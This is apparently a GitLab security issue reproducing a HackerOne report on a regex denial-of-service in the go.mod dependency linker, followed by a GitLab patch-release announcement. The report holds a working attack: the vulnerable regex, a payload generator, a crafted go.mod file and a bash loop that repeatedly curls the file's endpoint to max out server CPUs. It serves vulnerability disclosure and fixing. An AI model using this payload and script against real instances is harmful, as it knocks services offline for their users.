# ReDoS in gomod dependency linker

⚠ **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2359528](https://hackerone.com/reports/2359528)** by `joaxcar` on 2024-02-09, assigned to [@cmaxim](/cmaxim "Costel Maxim"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

This is the regexp to check for go package paths

```
def go_package_regex
        # A Go package name looks like a URL but is not; it:
        #   - Must not have a scheme, such as http:// or https://
        #   - Must not have a port number, such as :8080 or :8443

        [@]go_package_regex ||= %r{
          \b (?# word boundary)
          (?<domain>
            [0-9a-z](?:(?:-|[0-9a-z]){0,61}[0-9a-z])? (?# first domain)
            (?:\.[0-9a-z](?:(?:-|[0-9a-z]){0,61}[0-9a-z])?)* (?# inner domains)
            \.[a-z]{2,} (?# top-level domain)
          )
          (?<path>/(?:
            [-/$_.+!*'(),0-9a-z] (?# plain URL character)
            | %[0-9a-f]{2})* (?# URL encoded character)
          )? (?# path)
          \b (?# word boundary)
        }ix
      end
```

It a quite an advanced regex, and it is vulnerable to catastrophic backtracking.

This regex is used as a part in the `gomod` linker like [this](https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/lib/gitlab/dependency_linker/go_mod_linker.rb)

```
      REGEX = Regexp.new("(?<name>#{NAME.source})(?:\\s+(?<version>v#{SEMVER.source}))?", SEMVER.options | NAME.options).freeze
```

An attacker can craft a payload of this structure

```
'a.a' + '0.0'.repeat(20000)
```

By creating a file looking like this

```
module example.com/mymodule

go 1.14

require (
    a.a0.00.00. <BIG_PAYLOAD> .00.00.0 v1.2.3
)
```

the attacker can make the GitLab instance unresponsive by sending 1 request a second to

> <https://gitlab.example.com/GROUP/PROJECT/-/blob/main/go.mod?ref_type=heads&format=json&viewer=simple>

to put all CPUs at max capacity (tested on 1K reference architecture)

##### Steps to reproduce

Use a local hosted Gitlab server

1. Log in to Gitlab
2. Create a new project (or use an existing one) make it public (for ease of attack)
3. Upload the file attached here (or create your own one named `go.mod`)

[![go.mod](data:image/gif;base64...)](https://user-content.gitlab-static.net/b482f118adbb16883e19a0228326cac9e5701c1c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64626334646630662d393561642d343332652d626363642d3433306233333937636366372f676f2e6d6f64)

4. Visit <https://gitlab.example.com/GROUP/PROJECT/-/blob/main/go.mod?ref_type=heads&format=json&viewer=simple>
5. Look in devtools that the request will eventually fail
6. To exhaust the server run this script in a terminal (change the URL)

```
###  !/bin/bash
###  URL to which the curl request will be made
URL="http://20.236.120.94/root/test/-/blob/main/go.mod?format=json&viewer=simple"

###  Duration for the loop to run: 1 minute (60 seconds)
DURATION=60

###  Start time
START_TIME=$(date +%s)

###  Loop until the duration is reached
while [ $(($(date +%s) - START_TIME)) -lt $DURATION ]; do
    # Make the curl request
    curl $URL &

    # Wait for 1 second
    sleep 1
done
```

7. SSH into the gitlab server and use `top` or `htop` to view the CPU usage

[![Screenshot_2024-02-09_at_09.04.22.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/4d95d5a5b21556c939e7773689570d0ac047cd8e/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63613136313230622d633932322d343332612d613037302d6266363732626634356139312f53637265656e73686f745f323032342d30322d30395f61745f30392e30342e32322e706e67)

##### Impact

DOS of gitlab instance and exhaustive resource consumption

##### What is the current *bug* behavior?

Creating a malicious `go.mod` file will cause REDOS

##### What is the expected *correct* behavior?

The `go.mod` file should not cause ReDos

#### Impact

DOS of gitlab instance and exhaustive resource consumption

# GitLab Patch Release: 17.0.2, 16.11.4, 16.10.7

Learn more about GitLab Patch Release: 17.0.2, 16.11.4, 16.10.7 for GitLab Community Edition (CE) and Enterprise Edition (EE).

Today we are releasing versions 17.0.2, 16.11.4, 16.10.7 for GitLab Community Edition (CE) and Enterprise Edition (EE).

These versions contain important bug and security fixes, and we strongly recommend that all GitLab installations be upgraded to
one of these versions immediately. GitLab.com is already running the patched version.

GitLab releases fixes for vulnerabilities in dedicated patch releases. There are two types of patch releases:
scheduled releases, and ad-hoc critical patches for high-severity vulnerabilities. Scheduled releases are released twice a month on the second and fourth Wednesdays.
For more information, you can visit our [releases handbook](https://handbook.gitlab.com/handbook/engineering/releases/) and [security FAQ](https://about.gitlab.com/security/faq/).
You can see all of GitLab release blog posts [here](/releases/categories/releases/).

For security fixes, the issues detailing each vulnerability are made public on our
[issue tracker](https://gitlab.com/gitlab-org/gitlab/-/issues/?sort=created_date&state=closed&label_name%5B%5D=bug%3A%3Avulnerability&confidential=no&first_page_size=100)
30 days after the release in which they were patched.

We are dedicated to ensuring all aspects of GitLab that are exposed to customers or that host customer data are held to
the highest security standards. As part of maintaining good security hygiene, it is highly recommended that all customers
upgrade to the latest patch release for their supported version. You can read more
[best practices in securing your GitLab instance](/blog/2020/05/20/gitlab-instance-security-best-practices/) in our blog post.

### Recommended Action

We **strongly recommend** that all installations running a version affected by the issues described below are **upgraded to the latest version as soon as possible**.

When no specific deployment type (omnibus, source code, helm chart, etc.) of a product is mentioned, this means all types are affected.
